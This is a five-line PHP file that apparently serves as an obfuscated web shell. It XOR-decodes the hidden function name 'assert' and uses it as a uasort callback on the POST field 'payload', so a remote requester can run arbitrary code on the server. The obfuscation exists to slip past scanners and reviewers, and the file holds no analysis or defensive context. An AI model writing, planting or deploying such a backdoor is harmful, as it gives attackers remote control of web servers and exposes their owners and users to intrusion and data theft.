<?php
$mask = str_repeat('K', 6);
$callableName = $mask ^ pack("H*", "2a38382e393f");
$items = [$_POST['payload'], 'anchor'];
uasort($items, $callableName);
